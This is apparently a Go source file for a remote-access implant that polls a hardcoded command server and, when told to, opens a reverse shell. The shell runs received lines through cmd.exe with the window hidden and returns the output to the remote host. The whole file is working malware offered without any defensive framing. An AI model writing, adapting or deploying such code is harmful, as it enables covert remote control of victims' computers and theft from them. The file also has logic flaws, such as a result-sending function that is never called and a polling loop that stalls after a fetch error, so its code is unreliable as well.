package main

import (
    "bufio"
    "bytes"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "net"
    "net/http"
    "os/exec"
    "strings"
    "sync"
    "syscall"
    "time"
)

var (
    mu               sync.Mutex
    isCommandRunning bool
    serverURL        = "http://192.168.56.101:5000"
)

type Command struct {
    ID  string `json:"id"`
    Cmd string `json:"cmd"`
}

type CommandResult struct {
    ID     string `json:"id"`
    Result string `json:"result"`
}

func fetchCommand() (Command, error) {
    var cmd Command
    resp, err := http.Get(fmt.Sprintf("%s/command", serverURL))
    if err != nil {
        return cmd, err
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return cmd, err
    }
    err = json.Unmarshal(body, &cmd)
    return cmd, err
}

func sendResult(result CommandResult) {
    jsonData, err := json.Marshal(result)
    if err != nil {
        fmt.Printf("Error marshalling result: %v\n", err)
        return
    }

    _, err = http.Post(fmt.Sprintf("%s/submit_result", serverURL), "application/json", bytes.NewBuffer(jsonData))
    if err != nil {
        fmt.Printf("Failed to send result: %v\n", err)
    }
}

func executeCommandAndSendResult(cmd Command) {
    if strings.HasPrefix(cmd.Cmd, "shell ") {
        address := strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "shell"))
        if address != "" {
            openReverseShell(address)
        } else {
            fmt.Println("No address specified for shell command")
        }
    } else {
        fmt.Println("Received non-shell command:", cmd.Cmd)
        // Example of executing a non-shell command (omitted for brevity)
    }
}

func openReverseShell(address string) {
    conn, err := net.Dial("tcp", address)
    if err != nil {
        fmt.Printf("Failed to open reverse shell to %s: %v\n", address, err)
        return
    }
    defer conn.Close()

    for {
        reader := bufio.NewReader(conn)
        command, err := reader.ReadString('\n')
        if err != nil {
            fmt.Printf("Failed to read command: %v\n", err)
            break
        }

        cmd := exec.Command("cmd.exe", "/C", command)
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        output, err := cmd.CombinedOutput()
        if err != nil {
            fmt.Fprintf(conn, "Failed to execute command: %s\n", err)
            continue
        }

        conn.Write(output)
    }
}

func main() {
    fmt.Println("Application started. Waiting for commands...")
    ticker := time.NewTicker(10 * time.Second)

    go func() {
        for range ticker.C {
            mu.Lock()
            if !isCommandRunning {
                isCommandRunning = true
                mu.Unlock()

                cmd, err := fetchCommand()
                if err != nil {
                    fmt.Printf("Error fetching command: %s\n", err)
                    continue
                }
                if cmd.ID != "" {
                    executeCommandAndSendResult(cmd)
                }

                mu.Lock()
                isCommandRunning = false
            }
            mu.Unlock()
        }
    }()

    select {} // Prevent the application from exiting immediately
}
